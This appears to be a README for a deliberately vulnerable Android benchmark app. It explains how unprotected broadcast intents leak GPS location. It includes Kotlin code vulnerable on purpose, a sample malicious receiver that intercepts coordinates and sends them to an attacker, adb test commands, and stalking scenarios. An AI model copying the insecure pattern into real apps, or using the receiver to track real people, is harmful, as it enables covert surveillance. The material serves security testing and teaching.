# oxo-android-ben60: Location Exposure via Broadcast Intent

## Vulnerability Overview

Location Exposure via Broadcast Intent occurs when Android applications send user location data through unprotected broadcast intents that any installed application can intercept without requiring location permissions. This vulnerability allows malicious apps to track user movements and build detailed location profiles without user consent or awareness.

## Attack Vector: Unprotected Location Broadcast Interception

**Brief Explanation**: A fitness tracking app that broadcasts location updates for internal synchronization but fails to protect these broadcasts with permissions, allowing any malicious app to intercept GPS coordinates, timestamps, and movement patterns without requesting location permissions from the user.

**Key Characteristics:**
- Location data sent via unprotected broadcast intents
- No permission requirements for receiving broadcasts
- Malicious apps can register broadcast receivers to intercept location data
- Complete location tracking possible without user awareness
- Bypasses Android's location permission system

**Vulnerable Code Pattern:**
```kotlin
// VULNERABLE: Unprotected location broadcast
fun broadcastLocationUpdate(location: Location) {
    val locationIntent = Intent("com.fittracker.LOCATION_UPDATE")
    locationIntent.putExtra("latitude", location.latitude)
    locationIntent.putExtra("longitude", location.longitude)
    locationIntent.putExtra("accuracy", location.accuracy)
    locationIntent.putExtra("timestamp", System.currentTimeMillis())
    locationIntent.putExtra("speed", location.speed)
    
    // VULNERABLE: No permission protection on broadcast
    sendBroadcast(locationIntent)  // Any app can receive this!
}

// Legitimate internal receiver for location sync
class LocationSyncReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "com.fittracker.LOCATION_UPDATE") {
            val lat = intent.getDoubleExtra("latitude", 0.0)
            val lng = intent.getDoubleExtra("longitude", 0.0)
            // Sync location to cloud for fitness tracking
            syncLocationToCloud(lat, lng)
        }
    }
}
```

**Malicious Receiver Code:**
```kotlin
// MALICIOUS: Steals location without permissions
class LocationStealerReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "com.fittracker.LOCATION_UPDATE") {
            val lat = intent.getDoubleExtra("latitude", 0.0)
            val lng = intent.getDoubleExtra("longitude", 0.0)
            val timestamp = intent.getLongExtra("timestamp", 0)
            val accuracy = intent.getFloatExtra("accuracy", 0f)
            
            // STOLEN: Complete location data without permissions
            Log.d("LOCATION_STOLEN", "User at: $lat, $lng (accuracy: ${accuracy}m)")
            
            // Send stolen location to attacker's server
            sendLocationToAttacker(lat, lng, timestamp)
        }
    }
}
```

## Testing

```bash
# Install the vulnerable fitness tracking app
adb install -r oxo-android-ben60.apk

# Launch FitTracker Pro
adb shell am start -n co.ostorlab.myapplication/.MainActivity

# Start location tracking (trigger GPS broadcasts)
adb shell input tap 540 800  # Tap "Start Workout" button

# Monitor broadcast intents for location data
adb shell dumpsys activity broadcasts | grep -A 10 -B 5 "LOCATION_UPDATE"

# Check for unprotected location broadcasts
adb shell dumpsys activity broadcasts | grep -A 15 "com.fittracker.LOCATION_UPDATE"

# Simulate malicious app intercepting location broadcasts
adb shell am broadcast -a com.fittracker.LOCATION_UPDATE \
  --ef latitude 40.7128 \
  --ef longitude -74.0060 \
  --ef accuracy 10.0 \
  --el timestamp 1693209600000

# Monitor for location leakage in system logs
adb logcat -s LocationStealerReceiver:D LOCATION_STOLEN:D

# Verify location data interception
adb shell dumpsys activity intents | grep -A 5 -B 5 "LOCATION_UPDATE"
```

**Expected Results:**
```
Historical broadcasts summary:
  com.fittracker.LOCATION_UPDATE
    extras: {latitude=40.7128, longitude=-74.0060, accuracy=10.0, timestamp=1693209600000}
    receivers: [multiple apps can receive this unprotected broadcast]
```

**Difficulty**: Easy-Medium

## Impact Assessment

- **Confidentiality**: Critical - Complete exposure of user location data and movement patterns
- **Integrity**: Low - Location data cannot be modified but can be manipulated for false tracking
- **Availability**: Low - Does not affect app functionality but enables stalking/harassment
- **OWASP Mobile Top 10**: M2 - Insecure Data Storage, M4 - Insecure Communication, M10 - Extraneous Functionality
- **CWE**: CWE-200 (Information Exposure), CWE-926 (Improper Export of Android Application Components)

## Location Tracking Attack Scenarios

1. **Silent Stalking**: Malicious apps track user movements without any visible permissions
2. **Behavioral Profiling**: Building detailed profiles of user routines and frequented locations  
3. **Corporate Espionage**: Tracking competitor employees or business associates
4. **Social Engineering**: Using location data for targeted phishing or harassment
5. **Data Aggregation**: Combining location data with other leaked information for identity theft

**Example Attack Flow:**
```bash
# 1. User installs fitness app and grants location permission
# 2. Malicious app installs without requesting location permissions
# 3. Malicious app registers broadcast receiver for location intents
# 4. Fitness app broadcasts location updates for internal sync
# 5. Malicious app silently intercepts all location broadcasts
# 6. Complete user tracking achieved without user awareness
```

This vulnerability demonstrates how unprotected broadcast intents can completely bypass Android's permission system and enable unauthorized location tracking.
